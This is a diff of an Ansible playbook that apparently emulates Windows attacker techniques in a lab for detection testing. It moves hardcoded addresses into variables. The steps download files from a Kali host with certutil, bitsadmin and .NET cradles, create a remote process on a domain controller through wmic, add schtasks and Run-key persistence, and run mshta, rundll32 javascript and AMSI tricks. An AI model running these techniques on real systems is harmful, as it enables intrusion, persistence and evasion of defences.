@@ -5,7 +5,8 @@
   vars:
     ts: "{{ lookup('pipe', 'date -u +%Y%m%d_%H%M%S') }}"
     cap: C:\slopmop-capture
-    kali_ip: 10.1.99.99
+    kali_ip: "{{ hostvars['kali'].ansible_host }}"
+    konoha_dc: "{{ hostvars['konoha-dc1'].ansible_host }}"
   tasks:
     # -------------------------------------------------------------------
     # LOLBin: certutil — download + encode/decode (T1140 / T1105)
@@ -14,7 +15,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-certutil_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-certutil_$ts.log"
         $out = ""
         $out += "=== LOLBin: certutil encode/decode ===`r`n"
 
@@ -45,10 +46,10 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-certutil-dl_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-certutil-dl_$ts.log"
         $downloadPath = "$env:TEMP\slopmop-downloaded.txt"
         $out = "=== LOLBin: certutil -urlcache ===`r`n"
-        $certutilResult = certutil -urlcache -split -f "http://10.1.99.99:8080/beacon.txt" $downloadPath 2>&1
+        $certutilResult = certutil -urlcache -split -f "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt" $downloadPath 2>&1
         $out += "certutil -urlcache result: $($certutilResult | Select-Object -Last 2)`r`n"
         $out += "Timestamp: $(Get-Date -Format o)`r`n"
         $out | Out-File -FilePath $log -Encoding UTF8
@@ -67,7 +68,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-bitsadmin_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-bitsadmin_$ts.log"
         $out = ""
         $out += "=== LOLBin: bitsadmin file transfer ===`r`n"
 
@@ -76,14 +77,14 @@
 
         # Create BITS job (T1197)
         bitsadmin /create $jobName 2>&1 | Out-Null
-        bitsadmin /addfile $jobName "http://10.1.99.99:8080/beacon.txt" $downloadPath 2>&1 | Out-Null
+        bitsadmin /addfile $jobName "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt" $downloadPath 2>&1 | Out-Null
         bitsadmin /resume $jobName 2>&1 | Out-Null
         Start-Sleep -Seconds 3
         $state = bitsadmin /info $jobName /verbose 2>&1
         bitsadmin /complete $jobName 2>&1 | Out-Null
 
         $out += "BITS job created: $jobName`r`n"
-        $out += "Target URL: http://10.1.99.99:8080/beacon.txt`r`n"
+        $out += "Target URL: http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt`r`n"
         $out += "Download path: $downloadPath`r`n"
         $out += "Job state: $($state | Select-String 'STATE')`r`n"
         $out += "Timestamp: $(Get-Date -Format o)`r`n"
@@ -103,7 +104,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-wmic_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-wmic_$ts.log"
         $out = ""
         $out += "=== LOLBin: wmic reconnaissance ===`r`n"
 
@@ -124,7 +125,7 @@
         $out += "--- wmic nicconfig ---`r`n$netcfg`r`n"
 
         # Remote process creation attempt (T1047)
-        $remoteWmic = wmic /node:"10.1.10.10" process call create "cmd.exe /c whoami > C:\Windows\Temp\slopmop-wmic.txt" 2>&1
+        $remoteWmic = wmic /node:"{% endraw %}{{ konoha_dc }}{% raw %}" process call create "cmd.exe /c whoami > C:\Windows\Temp\slopmop-wmic.txt" 2>&1
         $out += "--- wmic remote process create (DC) ---`r`n$remoteWmic`r`n"
 
         $out += "Timestamp: $(Get-Date -Format o)`r`n"
@@ -144,7 +145,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-schtasks_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-schtasks_$ts.log"
         $out = ""
         $out += "=== LOLBin: schtasks persistence ===`r`n"
 
@@ -181,7 +182,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-regrun_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-regrun_$ts.log"
         $out = ""
         $out += "=== LOLBin: registry Run key persistence ===`r`n"
 
@@ -220,14 +221,14 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-mshta_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-mshta_$ts.log"
         $out = ""
         $out += "=== LOLBin: mshta inline execution ===`r`n"
 
         # Build an HTA that writes a marker file and self-closes
         $htaContent = '<html><head><script language="VBScript">' + "`r`n"
         $htaContent += 'Set fso = CreateObject("Scripting.FileSystemObject")' + "`r`n"
-        $htaContent += 'Set f = fso.CreateTextFile("C:\slopmop-capture\mshta-beacon_' + $ts + '.txt", True)' + "`r`n"
+        $htaContent += 'Set f = fso.CreateTextFile("{% endraw %}{{ cap }}{% raw %}\mshta-beacon_' + $ts + '.txt", True)' + "`r`n"
         $htaContent += 'f.WriteLine "slopMop mshta beacon: " & CreateObject("WScript.Network").ComputerName' + "`r`n"
         $htaContent += 'f.WriteLine "User: " & CreateObject("WScript.Network").UserName' + "`r`n"
         $htaContent += 'f.WriteLine "Timestamp: " & Now' + "`r`n"
@@ -242,8 +243,8 @@
         $out += "mshta.exe PID: $($proc.Id), ExitCode: $($proc.ExitCode)`r`n"
         $out += "HTA path: $htaPath`r`n"
 
-        if (Test-Path "C:\slopmop-capture\mshta-beacon_$ts.txt") {
-            $beacon = Get-Content "C:\slopmop-capture\mshta-beacon_$ts.txt" -Raw
+        if (Test-Path "{% endraw %}{{ cap }}{% raw %}\mshta-beacon_$ts.txt") {
+            $beacon = Get-Content "{% endraw %}{{ cap }}{% raw %}\mshta-beacon_$ts.txt" -Raw
             $out += "Beacon file created: YES`r`n$beacon`r`n"
         } else {
             $out += "Beacon file: NOT created (Defender may have blocked)`r`n"
@@ -267,7 +268,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-rundll32_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-rundll32_$ts.log"
         $out = ""
         $out += "=== LOLBin: rundll32 DLL load ===`r`n"
 
@@ -296,7 +297,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\lol-rundll32-js_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-rundll32-js_$ts.log"
         $out = "=== LOLBin: rundll32 javascript proxy ===`r`n"
         $rundllArgs = "javascript:""\..\mshtml,RunHTMLApplication"";document.write('slopMop');close()"
         $proc = Start-Process -FilePath "rundll32.exe" -ArgumentList $rundllArgs `
@@ -325,7 +326,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\net-addtype_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-addtype_$ts.log"
         $out = ""
         $out += "=== .NET: Add-Type inline C# compilation ===`r`n"
 
@@ -366,7 +367,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\net-reflection_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-reflection_$ts.log"
         $out = ""
         $out += "=== .NET: Reflection.Assembly.Load from bytes ===`r`n"
 
@@ -418,10 +419,10 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\net-cradles_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-cradles_$ts.log"
         $out = ""
         $out += "=== .NET: WebClient + WebRequest cradles ===`r`n"
-        $targetUrl = "http://10.1.99.99:8080/beacon.txt"
+        $targetUrl = "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt"
 
         try {
             $wc = New-Object System.Net.WebClient
@@ -458,10 +459,10 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\net-cradles-http_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-cradles-http_$ts.log"
         $out = ""
         $out += "=== .NET: HttpClient + BitsTransfer cradles ===`r`n"
-        $targetUrl = "http://10.1.99.99:8080/beacon.txt"
+        $targetUrl = "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt"
 
         try {
             Add-Type -AssemblyName System.Net.Http
@@ -501,7 +502,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\net-amsi_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-amsi_$ts.log"
         $out = ""
         $out += "=== .NET: AMSI interaction ===`r`n"
 
@@ -554,7 +555,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $log = "C:\slopmop-capture\net-wmi-com_$ts.log"
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-wmi-com_$ts.log"
         $out = ""
         $out += "=== .NET: WMI + COM object abuse ===`r`n"
 
@@ -612,7 +613,7 @@
     - name: List LOLBin and .NET evidence
       ansible.windows.win_shell: |
         {% raw %}
-        Get-ChildItem "C:\slopmop-capture" | Where-Object { $_.Name -match 'lol-|net-|mshta-' } |
+        Get-ChildItem "{% endraw %}{{ cap }}{% raw %}" | Where-Object { $_.Name -match 'lol-|net-|mshta-' } |
           Format-Table Name,Length,LastWriteTime -AutoSize |
           Out-String -Width 120
         {% endraw %}
